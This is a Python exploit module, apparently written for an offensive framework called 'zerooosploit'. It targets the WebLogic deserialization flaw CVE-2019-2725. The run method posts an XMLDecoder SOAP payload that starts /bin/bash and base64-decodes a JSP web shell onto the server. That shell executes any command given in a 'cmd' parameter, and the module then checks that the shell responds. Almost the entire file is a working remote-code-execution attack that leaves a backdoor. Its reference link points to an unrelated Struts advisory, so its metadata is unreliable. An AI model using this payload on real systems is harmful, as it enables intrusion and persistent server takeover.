#!/usr/bin/python
# -*- coding:utf8 -*-
"""
exp 模版

"""
from zerooosploit import exploits
from zerooosploit import color
import prettytable as pt
import requests


class Exploit(exploits.ExploitAggregate):

    option = {
        """
        初始化exp所需要的属性
        格式为字典，通过default来设置对应属性
        """
        'url': {'default': 'http://your-ip:7001'},
        'username': {'default': 'admin'},
        'password': {'default': 'admin888'}
    }

    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            """
            漏洞信息
            """
            'name': 'cve-2019-2725',
            'product': 'weblogic',
            'authors': '',
            'references': 'https://cwiki.apache.org/confluence/display/WW/S2-057',
            'cve': 'CVE-2019-2725',
            'create_date': '2019-05-30'}

    def register_option(self, key, value):
        """
        不需要改动，设置漏洞属性方法
        """
        if key in self.option.keys():
            self.option[key]['default'] = value

    def get_options(self, key):
        """
        不需要改动，获取漏洞属性方法
        """
        return self.option[key]['default']

    def show_options(self):
        """
        不需要改动，查看漏洞参数设置
        """
        tb = pt.PrettyTable()
        field_names = []
        add_row = []
        for v, k in self.option.items():
            field_names.append(v)
            for x in k.values():
                add_row.append(x)
        tb.field_names = field_names
        tb.add_row(add_row)
        print(tb)

    def show_info(self):
        """
        不需要改动，查看漏洞详细信息
        """
        tb = pt.PrettyTable()
        field_names = []
        add_row = []
        for v, k in self.info.items():
            field_names.append(v)
            add_row.append(k)
        tb.field_names = field_names
        tb.add_row(add_row)
        print(tb)

    def run(self):
        """
        漏洞利用方法， color.fail_tips函数输出失败结果，color.success_tips函数输出成功结果
        """
        url = self.get_options('url') + '/_async/AsyncResponseService'
        print(url)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
            'Content-Type': 'text/xml',
            'Content-Length': '2163',
            'cache-control': 'no-cache'}

        payload = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.4.0" class="java.beans.XMLDecoder">
      <void class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="3">
          <void index="0">
            <string>/bin/bash</string>
          </void>
          <void index="1">
            <string>-c</string>
          </void>
          <void index="2">
            <string>echo IDwlQCBwYWdlIGltcG9ydD0iamF2YS51dGlsLiosamF2YS5pby4qIiU+CjwlCiU+CjxIVE1MPjxCT0RZPgpDb21tYW5kcyB3aXRoIEpTUAo8Rk9STSBNRVRIT0Q9IkdFVCIgTkFNRT0ibXlmb3JtIiBBQ1RJT049IiI+CjxJTlBVVCBUWVBFPSJ0ZXh0IiBOQU1FPSJjbWQiPgo8SU5QVVQgVFlQRT0ic3VibWl0IiBWQUxVRT0iU2VuZCI+CjwvRk9STT4KPHByZT4KPCUKaWYgKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKSAhPSBudWxsKSB7CiAgICBvdXQucHJpbnRsbigiQ29tbWFuZDogIiArIHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKSArICI8QlI+Iik7CiAgICBQcm9jZXNzIHA7CiAgICBpZiAoIFN5c3RlbS5nZXRQcm9wZXJ0eSgib3MubmFtZSIpLnRvTG93ZXJDYXNlKCkuaW5kZXhPZigid2luZG93cyIpICE9IC0xKXsKICAgICAgICBwID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygiY21kLmV4ZSAvQyAiICsgcmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKTsKICAgIH0KICAgIGVsc2V7CiAgICAgICAgcCA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKTsKICAgIH0KICAgIE91dHB1dFN0cmVhbSBvcyA9IHAuZ2V0T3V0cHV0U3RyZWFtKCk7CiAgICBJbnB1dFN0cmVhbSBpbiA9IHAuZ2V0SW5wdXRTdHJlYW0oKTsKICAgIERhdGFJbnB1dFN0cmVhbSBkaXMgPSBuZXcgRGF0YUlucHV0U3RyZWFtKGluKTsKICAgIFN0cmluZyBkaXNyID0gZGlzLnJlYWRMaW5lKCk7CiAgICB3aGlsZSAoIGRpc3IgIT0gbnVsbCApIHsKICAgIG91dC5wcmludGxuKGRpc3IpOwogICAgZGlzciA9IGRpcy5yZWFkTGluZSgpOwogICAgfQp9CiU+CjwvcHJlPgo8L0JPRFk+PC9IVE1MPiAKCg== |base64 -d > servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/1.jsp</string>
          </void>
        </array>
        <void method="start"/></void>
    </java>
</work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>'''
        try:

            r = requests.post(
                url=url,
                data=payload,
                headers=headers,
                timeout=60)

            s = requests.get(
                url=self.get_options('url') +
                '/bea_wls_internal/1.jsp',
                timeout=60).status_code
            if s == 200:
                print(
                    color.success_tips(
                        self.get_options('url') +
                        '/bea_wls_internal/1.jsp'))
            else:
                print(color.fail_tips(url, ''))
        except BaseException:
            print(color.fail_tips(url, 'error'))


def main():
    """
    调用run方法
    """
    exploit = Exploit()
    exploit.run()
